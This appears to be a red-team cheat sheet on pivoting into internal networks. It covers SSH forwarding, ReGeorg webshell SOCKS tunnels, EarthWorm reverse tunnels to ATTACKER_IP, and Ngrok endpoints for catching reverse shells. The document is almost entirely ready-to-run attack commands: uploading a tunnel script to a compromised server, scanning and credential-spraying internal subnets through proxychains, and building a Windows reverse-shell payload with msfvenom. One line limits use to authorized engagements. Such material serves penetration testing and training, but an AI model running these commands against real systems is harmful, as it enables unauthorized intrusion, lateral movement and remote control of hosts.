# SSH / ReGeorg / EarthWorm / Ngrok Pivoting

## SSH Port Forwarding

```bash
# Local forward: access INTERNAL_IP:PORT via localhost:LOCAL_PORT
ssh -L LOCAL_PORT:INTERNAL_IP:INTERNAL_PORT user@PIVOT_IP
# e.g. expose internal RDP: ssh -L 13389:192.168.1.10:3389 user@pivot
# then: xfreerdp /v:127.0.0.1:13389 /u:admin /p:pass

# Remote forward: expose local port on attacker through pivot
ssh -R REMOTE_PORT:localhost:LOCAL_PORT user@ATTACKER_IP

# Dynamic forward — full SOCKS5 proxy through pivot
ssh -D 1080 -N -f user@PIVOT_IP
# then proxychains uses 127.0.0.1:1080

# Persistent tunnel (reconnects on drop)
autossh -M 0 -D 1080 -N -f user@PIVOT_IP

# Jump host chaining (two-hop pivot)
ssh -J user@PIVOT1 user@PIVOT2 -D 1080
```

**Key flags**: `-N` (no shell), `-f` (background), `-o ServerAliveInterval=30`

---

## ReGeorg (webshell-based SOCKS — no binary upload needed)

```bash
# 1. Upload tunnel script to web server (matches server language)
#    tunnel.php / tunnel.aspx / tunnel.jsp / tunnel.js (Node)

# 2. Attacker: start SOCKS proxy
python reGeorgSocksProxy.py -l 1080 -u http://TARGET/uploads/tunnel.php
# With auth:
python reGeorgSocksProxy.py -l 1080 -u http://TARGET/tunnel.php -H "Cookie: session=abc"

# 3. Use via proxychains
proxychains nmap -sT -p 80,443,445 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.0/24 -u admin -p pass
```

**When to use**: already have webshell/RCE, can't upload binaries, target web server is the pivot.

---

## EarthWorm (Windows-friendly, no dependencies)

```bash
# Direct SOCKS5 on pivot host (accessible from attacker)
ew -s ssocksd -l 1080

# Reverse tunnel — pivot connects out to attacker
# Attacker:
ew -s rcsocks -l 1080 -e 9999
# Pivot host:
ew -s rssocks -d ATTACKER_IP -e 9999
# Then proxychains → 127.0.0.1:1080 on attacker

# Multi-hop (attacker → pivot1 → pivot2 → internal)
# Pivot1 (already accessible from attacker):
ew -s lcx_listen -l 1080 -e 9999
# Pivot2 (only accessible from pivot1):
ew -s lcx_slave -d PIVOT1_IP -e 9999 -f 127.0.0.1 -g 1081
# Pivot2 SOCKS:
ew -s ssocksd -l 1081
```

---

## Ngrok (no server required — external tunnel)

```bash
# Expose local listener to internet (good for catching reverse shells)
ngrok tcp 4444              # get public TCP endpoint
ngrok http 8080             # HTTP tunnel with web inspector

# Use ngrok URL as LHOST in payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=0.tcp.ngrok.io LPORT=12345 -f exe -o shell.exe
```

**Limitation**: free tier has random subdomains; paid gives fixed domains. Ngrok traffic is logged by Ngrok — use only in authorized engagements.

---

## Double Pivot Pattern

```
Attacker ←── Chisel/SSH ──→ Pivot1 ←── Ligolo agent ──→ Pivot2 → Internal
```

1. Chisel/SSH tunnel from attacker to Pivot1 (SOCKS on 1080)
2. Through SOCKS: deploy Ligolo agent on Pivot2
3. Ligolo agent connects back through Pivot1's SOCKS to attacker's Ligolo proxy
4. Add route for Pivot2's internal subnet
